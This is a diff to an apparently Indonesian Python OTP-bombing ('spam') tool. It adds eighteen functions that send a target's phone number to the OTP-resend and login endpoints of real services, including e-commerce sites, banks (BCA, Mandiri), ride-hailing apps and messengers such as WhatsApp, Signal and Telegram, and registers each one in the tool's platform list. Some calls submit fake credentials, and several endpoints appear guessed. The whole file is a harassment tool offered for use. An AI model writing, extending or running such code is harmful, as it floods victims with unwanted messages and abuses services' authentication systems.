@@ -2987,7 +2987,303 @@ def spam_starbucks(phone_plus):
     try:
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
-        return None                  
+        return None      
+# ============================================================
+# ENDPOINT RESEND / FORGOT PASSWORD (LEBIH WORK)
+# ============================================================
+
+# 141. Shopee - Resend OTP (login)
+def spam_shopee_resend(phone_plus):
+    url = "https://shopee.co.id/api/v1/account/phone/request_otp"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://shopee.co.id",
+        "Referer": "https://shopee.co.id/",
+        "x-api-source": "pc",
+    }
+    payload = {"phone": phone_plus, "request_id": str(uuid.uuid4()), "source": "login"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 142. Gojek - Resend OTP
+def spam_gojek_resend(phone_plus):
+    url = "https://api.gojekapi.com/v1/customers/register/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.gojek.com",
+        "Referer": "https://www.gojek.com/",
+    }
+    payload = {"phone_number": phone_plus, "country_code": "62"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 143. OVO - Resend OTP
+def spam_ovo_resend(phone_plus):
+    url = "https://api.ovo.id/api/v1/auth/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.ovo.id",
+        "Referer": "https://www.ovo.id/",
+    }
+    payload = {"phone": phone_plus, "countryCode": "62"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 144. Grab - Resend OTP
+def spam_grab_resend(phone_plus):
+    url = "https://api.grab.com/v1/authentication/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.grab.com",
+        "Referer": "https://www.grab.com/",
+    }
+    payload = {"phoneNumber": phone_plus, "countryCode": "62"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 145. Lazada - Resend OTP
+def spam_lazada_resend(phone_plus):
+    url = "https://auth.lazada.co.id/rest/auth/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://auth.lazada.co.id",
+        "Referer": "https://auth.lazada.co.id/",
+    }
+    payload = {"mobile": phone_plus, "type": "login"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 146. Bukalapak - Resend OTP
+def spam_bukalapak_resend(phone_plus):
+    url = "https://api.bukalapak.com/v2/otp/resend.json"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bukalapak.com",
+        "Referer": "https://www.bukalapak.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 147. BCA - Resend OTP
+def spam_bca_resend(phone_08):
+    url = "https://api.bca.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bca.co.id",
+        "Referer": "https://www.bca.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 148. Mandiri - Resend OTP
+def spam_mandiri_resend(phone_08):
+    url = "https://api.bankmandiri.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankmandiri.co.id",
+        "Referer": "https://www.bankmandiri.co.id/",
+    }
+    payload = {"phone": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None         
+        
+# ============================================================
+# TAMBAHAN 10 LAYANAN OTP (RESEND / FORGOT PASSWORD)
+# ============================================================
+
+# 149. TikTok - Resend OTP (login)
+def spam_tiktok_resend(phone_plus):
+    url = "https://www.tiktok.com/api/v1/auth/otp/resend/"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.tiktok.com",
+        "Referer": "https://www.tiktok.com/login/phone",
+    }
+    payload = {"phone_number": phone_plus, "country_code": "62"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 150. Instagram - Resend OTP (login)
+def spam_instagram_resend(phone_plus):
+    url = "https://www.instagram.com/api/v1/web/accounts/login/otp/resend/"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.instagram.com",
+        "Referer": "https://www.instagram.com/accounts/login/",
+    }
+    payload = {"phone_number": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 151. Facebook - Resend OTP (login)
+def spam_facebook_resend(phone_plus):
+    url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.facebook.com",
+        "Referer": "https://www.facebook.com/login/",
+    }
+    payload = {"email": phone_plus, "pass": "fake", "login": "Masuk"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 152. Twitter - Resend OTP
+def spam_twitter_resend(phone_plus):
+    url = "https://api.twitter.com/1.1/account/update_profile.json"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://twitter.com",
+        "Referer": "https://twitter.com/login",
+    }
+    payload = {"email": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 153. Telegram - Resend OTP
+def spam_telegram_resend(phone_plus):
+    url = "https://my.telegram.org/auth/send_password"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://my.telegram.org",
+        "Referer": "https://my.telegram.org/auth",
+    }
+    payload = {"phone": phone_plus, "to": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 154. WhatsApp - Resend OTP (via web)
+def spam_whatsapp_resend(phone_plus):
+    url = "https://web.whatsapp.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://web.whatsapp.com",
+        "Referer": "https://web.whatsapp.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 155. LINE - Resend OTP
+def spam_line_resend(phone_plus):
+    url = "https://access.line.me/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://access.line.me",
+        "Referer": "https://access.line.me/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 156. WeChat - Resend OTP
+def spam_wechat_resend(phone_plus):
+    url = "https://login.wechat.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://login.wechat.com",
+        "Referer": "https://login.wechat.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 157. Signal - Resend OTP
+def spam_signal_resend(phone_plus):
+    url = "https://api.signal.org/v1/accounts/voice/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://signal.org",
+        "Referer": "https://signal.org/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 158. Discord - Resend OTP
+def spam_discord_resend(phone_plus):
+    url = "https://discord.com/api/v9/auth/register"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://discord.com",
+        "Referer": "https://discord.com/register",
+    }
+    payload = {"email": phone_plus, "username": "user", "password": "pass"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None                        
 # ============================================================
 # DAFTAR PLATFORM (72+)
 # ============================================================
@@ -3122,6 +3418,24 @@ PLATFORMS = [
 ("KFC", spam_kfc, "plus"),
 ("McDonald's", spam_mcd, "plus"),
 ("Starbucks", spam_starbucks, "plus"),
+("Shopee (Resend)", spam_shopee_resend, "plus"),
+("Gojek (Resend)", spam_gojek_resend, "plus"),
+("OVO (Resend)", spam_ovo_resend, "plus"),
+("Grab (Resend)", spam_grab_resend, "plus"),
+("Lazada (Resend)", spam_lazada_resend, "plus"),
+("Bukalapak (Resend)", spam_bukalapak_resend, "plus"),
+("BCA (Resend)", spam_bca_resend, "08"),
+("Mandiri (Resend)", spam_mandiri_resend, "08"),
+("TikTok (Resend)", spam_tiktok_resend, "plus"),
+("Instagram (Resend)", spam_instagram_resend, "plus"),
+("Facebook (Resend)", spam_facebook_resend, "plus"),
+("Twitter (Resend)", spam_twitter_resend, "plus"),
+("Telegram (Resend)", spam_telegram_resend, "plus"),
+("WhatsApp (Resend)", spam_whatsapp_resend, "plus"),
+("LINE (Resend)", spam_line_resend, "plus"),
+("WeChat (Resend)", spam_wechat_resend, "plus"),
+("Signal (Resend)", spam_signal_resend, "plus"),
+("Discord (Resend)", spam_discord_resend, "plus"),
 ]
 
 # ============================================================
